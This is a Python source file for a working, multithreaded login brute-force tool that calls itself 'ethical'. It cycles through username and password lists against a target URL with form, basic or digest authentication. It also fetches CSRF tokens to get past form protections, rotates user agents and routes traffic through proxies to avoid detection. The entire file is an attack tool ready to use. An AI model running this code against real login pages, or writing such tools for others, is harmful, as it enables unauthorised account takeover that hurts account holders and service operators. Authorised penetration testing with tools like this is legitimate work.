# bruteforce_tool/bruteforce.py
import argparse
import requests
import time
import threading
from utils import update_wordlists, get_random_user_agent

def fetch_csrf(csrf_url, csrf_field):
    try:
        r = requests.get(csrf_url)
        if csrf_field in r.text:
            import re
            token = re.search(f'name="{csrf_field}" value="(.*?)"', r.text)
            return token.group(1) if token else ""
    except Exception as e:
        print(f"[!] Error fetching CSRF token: {e}")
    return ""

def try_login(username, password, args, lock):
    headers = {
        "User-Agent": get_random_user_agent()
    }
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    data = {
        args.user_field: username,
        args.pass_field: password
    }

    if args.csrf_field and args.csrf_url:
        data[args.csrf_field] = fetch_csrf(args.csrf_url, args.csrf_field)

    try:
        if args.auth_type == "form":
            response = requests.post(args.url, data=data, headers=headers, proxies=proxies)
        elif args.auth_type == "basic":
            response = requests.get(args.url, auth=(username, password), headers=headers, proxies=proxies)
        elif args.auth_type == "digest":
            response = requests.get(args.url, auth=requests.auth.HTTPDigestAuth(username, password), headers=headers, proxies=proxies)

        with lock:
            if args.fail_identifier not in response.text:
                print(f"[+] SUCCESS: {username}:{password}")
            else:
                print(f"[-] Failed: {username}:{password}")

        if response.status_code == 429:
            print("[!] Rate limit detected. Sleeping 60s...")
            time.sleep(60)

    except Exception as e:
        with lock:
            print(f"[!] Error: {e}")

def run_bruteforce(args):
    # Load passwords
    with open(args.passlist, "r", encoding="utf-8", errors="ignore") as pf:
        passwords = [line.strip() for line in pf if line.strip()]

    # Load usernames
    if args.user.endswith(".txt"):
        with open(args.user, "r", encoding="utf-8", errors="ignore") as uf:
            usernames = [line.strip() for line in uf if line.strip()]
    else:
        usernames = [args.user]

    lock = threading.Lock()
    threads = []

    for username in usernames:
        for password in passwords:
            t = threading.Thread(target=try_login, args=(username, password, args, lock))
            threads.append(t)
            t.start()
            time.sleep(args.delay)

            while threading.active_count() > args.threads:
                time.sleep(0.1)

    for t in threads:
        t.join()

    print("[+] Brute force completed.")

# Subcommand parser
def main():
    parser = argparse.ArgumentParser(description="Ethical Brute Force Tool")
    subparsers = parser.add_subparsers(dest="command", required=True)

    # Subcommand: update wordlists
    update_parser = subparsers.add_parser("update", help="Update wordlists")
    update_parser.set_defaults(func=lambda args: update_wordlists())

    # Subcommand: run brute force
    run_parser = subparsers.add_parser("run", help="Run brute force attack")
    run_parser.add_argument("--url", required=True, help="Target login URL")
    run_parser.add_argument("--user", required=True, help="Username or path to usernames file")
    run_parser.add_argument("--passlist", required=True, help="Path to password list")
    run_parser.add_argument("--user-field", default="username")
    run_parser.add_argument("--pass-field", default="password")
    run_parser.add_argument("--fail-identifier", required=True, help="Text indicating failed login")
    run_parser.add_argument("--threads", type=int, default=5, help="Number of parallel threads")
    run_parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests")
    run_parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    run_parser.add_argument("--auth-type", choices=["basic", "digest", "form"], default="form")
    run_parser.add_argument("--csrf-field", help="CSRF token form field name")
    run_parser.add_argument("--csrf-url", help="URL to fetch CSRF token from")
    run_parser.set_defaults(func=run_bruteforce)

    args = parser.parse_args()
    args.func(args)

if __name__ == "__main__":
    main()
